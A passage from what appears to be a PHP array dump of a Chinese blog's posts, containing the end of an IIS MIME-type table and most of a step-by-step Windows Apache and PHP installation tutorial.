#aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-wais-source</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">sst</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-pkicertstore</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">stl</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-pkistl</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">stm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/html</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">svg</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/svg+xml</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">sv4cpio</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-sv4cpio</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">sv4crc</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-sv4crc</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">swf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-shockwave-flash</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">t</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-troff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tar</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-tar</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tcl</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-tcl</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tex</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-tex</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">texi</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-texinfo</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">texinfo</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-texinfo</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tgz</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-compressed</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tif</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/tiff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tiff</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/tiff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tr</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-troff</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">trm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msterminal</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">tsv</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/tab-separated-values</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">txt</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/plain</td></tr></tbody></table><p><span style=\\"color:#ff0000;\\"><strong>再添几个常用的</strong></span></p><p><span style=\\"color:#ff0000;\\"><strong>apk&nbsp;&nbsp;&nbsp; application/vnd.android.package-archive</strong></span></p><p>MRP文件（国内普遍的手机）</p><p>.mrp application/octet-stream</p><p><strong>IPA文件(IPHONE)</strong></p><p>.ipa application/iphone-package-archive</p><p>.deb application/x-debian-package-archive</p><p>APK文件(安卓系统)</p><p>.apk application/vnd.android.package-archive</p><p>CAB文件(Windows Mobile)</p><p>.cab application/vnd.cab-com-archive</p><p><strong>XAP文件(Windows Phone 7)</strong></p><p>.xap application/x-silverlight-app</p><p>SIS文件(symbian平台/S60V1)</p><p>.sis application/vnd.symbian.install-archive *（下有）</p><p>SISX文件(symbian平台/S60V3/V5)</p><p>.sisx application/vnd.symbian.epoc/x-sisx-app</p><p>文章转自：http://www.cr173.com/html/18997_1.html</p><br/>',
            'keyword' => 'IIS,MIME',
            'sortid' => '5',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:47:06',
          ),
          31 => 
          array (
            'id' => '54',
            'uid' => '1',
            'title' => '如何在Windows下配置搭建PHP环境',
            'content' => '<p><span style=\\"font-family:Arial\\"><span style=\\"font-family: 宋体\\"> 现在很多站长</span>PHP<span style=\\"font-family: 宋体\\">构建网站，因为</span>PHP<span style=\\"font-family: 宋体\\">相对于其他的语言功能强大又简单易学，</span>PHP<span style=\\"font-family: 宋体\\">具有非常强大的功能，所有的</span>CGI<span style=\\"font-family: 宋体\\">的功能</span>PHP<span style=\\"font-family: 宋体\\">都能实现，而且支持几乎所有流行的数据库以及操作系统。最大的原因可能是因为几乎所有用</span>PHP<span style=\\"font-family: 宋体\\">编写的网站程序都开源，可以直接下载使用并修改，这给站长们特别是个人站长建设网站节约了很多的时间和精力。我们在用</span>PHP<span style=\\"font-family: 宋体\\">建网站的时候，首先要面临的问题就是</span>php<span style=\\"font-family: 宋体\\">环境搭建，今天笔者就跟大家分享一下如何在</span>windows<span style=\\"font-family: 宋体\\">下配置搭建</span>PHP<span style=\\"font-family: 宋体\\">开发环境，笔者主要讲的是搭建</span>Apache+php<span style=\\"font-family: 宋体\\">开发环境。</span> <p><span style=\\"font-family: 宋体\\">配置搭建</span>Apache+php<span style=\\"font-family: 宋体\\">环境的软件准备：</span></p><p>Apache<span style=\\"font-family: 宋体\\">官方下载地址：</span>apache_2.0.55-win32-x86-no_ssl.msi</p><p>php<span style=\\"font-family: 宋体\\">官方下载地址：</span>php-5.0.5-Win32.zip</p><p><span style=\\"font-family: 宋体\\">一、安装</span>Apache<span style=\\"font-family: 宋体\\">，配置成功一个普通网站服务器</span></p><p><span style=\\"font-family: 宋体\\">运行下载好的“</span>apache_2.0.55-win32-x86-no_ssl.msi<span style=\\"font-family: 宋体\\">”，出现如下界面：</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090201.gif\\" height=\\"389\\" width=\\"504\\"/></span></p><p><span style=\\"font-family: 宋体\\">出现</span>Apache HTTP Server 2.0.55<span style=\\"font-family: 宋体\\">的安装向导界面，点“</span>Next<span style=\\"font-family: 宋体\\">”继续</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090202.gif\\" height=\\"387\\" width=\\"503\\"/></span></p><p><span style=\\"font-family: 宋体\\">确认同意软件安装使用许可条例，选择“</span>I accept the terms in the license agreement<span style=\\"font-family: 宋体\\">”，点“</span>Next<span style=\\"font-family: 宋体\\">”继续</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090203.gif\\" height=\\"386\\" width=\\"503\\"/></span></p><p><span style=\\"font-family: 宋体\\">将</span>Apache<span style=\\"font-family: 宋体\\">安装到</span>Windows<span style=\\"font-family: 宋体\\">上的使用须知，请阅读完毕后，按“</span>Next<span style=\\"font-family: 宋体\\">”继续</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090204.gif\\" height=\\"388\\" width=\\"503\\"/></span></p><p><span style=\\"font-family: 宋体\\">设置系统信息，在</span>Network Domain<span style=\\"font-family: 宋体\\">下填入您的域名（比如：</span>qdsulian.com<span style=\\"font-family: 宋体\\">），在</span>Server Name<span style=\\"font-family: 宋体\\">下填入您的服务器名称（比如：</span>www.qdsulian.com<span style=\\"font-family: 宋体\\">，也就是主机名加上域名），在</span>Administrator’s Email Address<span style=\\"font-family: 宋体\\">下填入系统管理员的联系电子邮件地址（比如：</span><a href=\\"mailto:info@qdsulian.com\\">info@qdsulian.com</a><span style=\\"font-family: 宋体\\">），上述三条信息仅供参考，其中联系电子邮件地址会在当系统故障时提供给访问者，三条信息均可任意填写，无效的也行。下面有两个选择，图片上选择的是为系统所有用户安装，使用默认的</span>80<span style=\\"font-family: 宋体\\">端口，并作为系统服务自动启动；另外一个是仅为当前用户安装，使用端口</span>8080<span style=\\"font-family: 宋体\\">，手动启动。一般选择如图所示。按“</span>Next<span style=\\"font-family: 宋体\\">”继续。</span>]</p><p><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090205.gif\\" height=\\"387\\" width=\\"502\\"/></p><p><span style=\\"font-family: 宋体\\">选择安装类型，</span>Typical<span style=\\"font-family: 宋体\\">为默认安装，</span>Custom<span style=\\"font-family: 宋体\\">为用户自定义安装，我们这里选择</span>Custom<span style=\\"font-family: 宋体\\">，有更多可选项。按“</span>Next<span style=\\"font-family: 宋体\\">”继续</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090206.gif\\" height=\\"387\\" width=\\"594\\"/></span></p><p><span style=\\"font-family: 宋体\\">出现选择安装选项界面，如图所示，左键点选“</span>Apache HTTP Server 2.0.55<span style=\\"font-family: 宋体\\">”，选择“</span>This feature, and all subfeatures, will be installed on local hard drive.<span style=\\"font-family: 宋体\\">”，即“此部分，及下属子部分内容，全部安装在本地硬盘上”。点选“</span>Change...<span style=\\"font-family: 宋体\\">”，手动指定安装目录。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090207.gif\\" height=\\"386\\" width=\\"500\\"/></span></p><p><span style=\\"font-family: 宋体\\">我这里选择安装在“</span>D:\\\\<span style=\\"font-family: 宋体\\">”，各位自行选取了，一般建议不要安装在操作系统所在盘，免得操作系统坏了之后，还原操作把</span>Apache<span style=\\"font-family: 宋体\\">配置文件也清除了。选“</span>OK<span style=\\"font-family: 宋体\\">”继续。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090208.gif\\" height=\\"387\\" width=\\"502\\"/></span></p><p><span style=\\"font-family: 宋体\\">返回刚才的界面，选“</span>Next<span style=\\"font-family: 宋体\\">”继续。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090209.gif\\" height=\\"386\\" width=\\"503\\"/></span></p><p><span style=\\"font-family: 宋体\\">确认安装选项无误，如果您认为要再检查一遍，可以点“</span>Back<span style=\\"font-family: 宋体\\">”一步步返回检查。点“</span>Install<span style=\\"font-family: 宋体\\">”开始按前面设定的安装选项安装。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090210.gif\\" height=\\"387\\" width=\\"503\\"/></span></p><p><span style=\\"font-family: 宋体\\">正在安装界面，请耐心等待，直到出现下面的画面。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090211.gif\\" height=\\"386\\" width=\\"504\\"/></span></p><p><span style=\\"font-family: 宋体\\">安装向导成功完成，这时右下角状态栏应该出现了下面的这个绿色图标，表示</span>Apache<span style=\\"font-family: 宋体\\">服务已经开始运行，按“</span>Finish<span style=\\"font-family: 宋体\\">”结束</span>Apache<span style=\\"font-family: 宋体\\">的软件安装</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090212.gif\\" height=\\"29\\" width=\\"39\\"/></span></p><p><span style=\\"font-family: 宋体\\">我们来熟悉一下这个图标，很方便的，在图标上左键单击，出现如下界面，有“</span>Start<span style=\\"font-family: 宋体\\">（启动）”、“</span>Stop<span style=\\"font-family: 宋体\\">（停止）”、“</span>Restart<span style=\\"font-family: 宋体\\">（重启动）”三个选项，可以很方便的对安装的</span>Apache<span style=\\"font-family: 宋体\\">服务器进行上述操作。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090213.gif\\" height=\\"78\\" width=\\"170\\"/></span></p><p><span style=\\"font-family: 宋体\\">好了现在我们来测试一下按默认配置运行的网站界面，在</span>IE<span style=\\"font-family: 宋体\\">地址栏打“</span>http://127.0.0.1<span style=\\"font-family: 宋体\\">”</span><span style=\\"font-family: 宋体\\">，点“转到”，就可以看到如下页面，表示</span>Apache<span style=\\"font-family: 宋体\\">服务器已安装成功。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090214.gif\\" height=\\"572\\" width=\\"588\\"/></span></p><p><span style=\\"font-family: 宋体\\">现在开始配置</span>Apache<span style=\\"font-family: 宋体\\">服务器，使它更好的替我们服务，事实上，如果不配置，你的安装目录下的</span>Apache2\\\\htdocs<span style=\\"font-family: 宋体\\">文件夹就是网站的默认根目录，在里面放入文件就可以了。这里我们还是要配置一下，有什么问题或修改，配置始终是要会的，如图所示，“开始”、“所有程序”、“</span>Apache HTTP Server 2.0.55<span style=\\"font-family: 宋体\\">”、“</span>Configure Apache Server<span style=\\"font-family: 宋体\\">”、“</span>Edit the Apache httpd conf Configuration file<span style=\\"font-family: 宋体\\">”，点击打开。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090215.gif\\" height=\\"100\\" width=\\"650\\"/></span></p><p>XP<span style=\\"font-family: 宋体\\">的记事本有了些小变化，很实用的一个功能就是可以看到文件内容的行、列位置，按下图所示，点“查看”，勾选“状态栏”，界面右下角就多了个标记，“</span>Ln 78, Col 10<span style=\\"font-family: 宋体\\">”</span><span style=\\"font-family: 宋体\\">就表示“行</span> 78<span style=\\"font-family: 宋体\\">，列</span> 10<span style=\\"font-family: 宋体\\">”</span><span style=\\"font-family: 宋体\\">，这样可以迅速的在文件中定位，方便解说。当然，你也可以通过“编辑”，“查找”输入关键字来快速定位。每次配置文件的改变，保存后，必须在</span> Apache<span style=\\"font-family: 宋体\\">服</span><span style=\\"font-family: 宋体\\">务器重启动后生效，可以用前面讲的小图标方便的控制服务器随时“重启动”。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090216.gif\\" height=\\"363\\" width=\\"435\\"/></span></p><p><span style=\\"font-family: 宋体\\">现在正式开始配置</span>Apache<span style=\\"font-family: 宋体\\">服务器，“</span>Ln 228<span style=\\"font-family: 宋体\\">”</span><span style=\\"font-family: 宋体\\">，或者查找关键字“</span>DocumentRoot<span style=\\"font-family: 宋体\\">”（也就是网站根目录），找到如下图所示地方，然后将</span>&quot;&quot;<span style=\\"font-family: 宋体\\">内的地址改成你的网站根目录，地址格式请照图上的写，主要是一般文件地址的“</span>\\\\<span style=\\"font-family: 宋体\\">”在</span>Apache<span style=\\"font-family: 宋体\\">里要改成“</span>/<span style=\\"font-family: 宋体\\">”。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090217.gif\\" height=\\"366\\" width=\\"431\\"/></span></p><p><span style=\\"font-family: 宋体\\">“</span>Ln 253<span style=\\"font-family: 宋体\\">”</span><span style=\\"font-family: 宋体\\">，同样，你也可以通过查找“</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090218.gif\\" height=\\"363\\" width=\\"433\\"/></span></p><p><span style=\\"font-family: 宋体\\">“</span>Ln321<span style=\\"font-family: 宋体\\">”</span><span style=\\"font-family: 宋体\\">，</span>DirectoryIndex<span style=\\"font-family: 宋体\\">（目录索引，也就是在仅指定目录的情况下，默认显示的文件名），可以添加很多，系统会根据从左至右的顺序来优先显示，以单个半角空格隔开，比如有些网站的首页是</span>index.htm<span style=\\"font-family: 宋体\\">，就在光标那里加上“</span>index.htm <span style=\\"font-family: 宋体\\">”文件名是任意的，不一定非得“</span>index.html<span style=\\"font-family: 宋体\\">”，比如“</span>test.php<span style=\\"font-family: 宋体\\">”等，都可以。</span></p><p><span style=\\"font-family: 宋体\\"><img alt=\\"\\" src=\\"http://www.qdexun.cn/UserFiles/Image/2013090219.gif\\" height=\\"365\\" width=\\"431\\"/></span></p><p><span style=\\"font-family: 